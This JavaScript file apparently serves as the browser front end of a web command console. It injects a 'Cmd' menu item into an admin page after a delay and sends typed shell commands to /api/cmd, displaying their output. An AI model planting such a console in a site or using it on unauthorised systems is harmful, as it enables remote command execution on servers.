function runCmd() {
	var out = document.getElementById("output");
	var cmd = document.getElementById("command");
	out.append(cmd.value + "\n");

	var url = "/api/cmd";
	var xhr = new XMLHttpRequest();
	xhr.open("PUT", url);
	xhr.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
	xhr.onreadystatechange = function () {
	   if (xhr.readyState === 4) {
		  out.append(xhr.responseText + "\n");
		  cmd.value = "";
	   }};
	xhr.send(cmd.value);
}

function sendCmd(e) {
	var evt = window.event || e;
	if (evt.keyCode == 13) {
		runCmd();
	}
}

function showCmd() {
	var xul=document.getElementById("content")
	var cmdHtml = '<div style="padding-left: 40px">';
	cmdHtml += '<div class="el-textarea"><textarea id="output" autocomplete="off" placeholder="cmd output..." class="el-textarea__inner" style="min-height: 400px; height: 33px;"></textarea></div>';
	cmdHtml += '<div class="el-input"><br /><input type="text" onkeydown="sendCmd(event);" class="el-input__inner" style="width:60%" id="command" name="command" placeholder="uname -a" />';
	cmdHtml += '&nbsp;&nbsp;<button type="button" onclick="javascript:runCmd();" class="el-button el-button--primary"><span>Run</span></button></div>';
	cmdHtml += '</div>';
	xul.innerHTML = cmdHtml;
}

setTimeout(function(){
	var xul = document.getElementsByTagName("ul")[0];
	var xli = document.createElement("li");
	xli.innerHTML= "Cmd";
	xli.setAttribute('style', 'padding-left: 20px;');
	xli.setAttribute('class', 'el-menu-item');
	xli.setAttribute('role', 'menuitem');
	xli.setAttribute('tabindex', '-1');
	xli.setAttribute('onClick', 'javascript:showCmd();');
	xul.appendChild(xli);
},"2000");
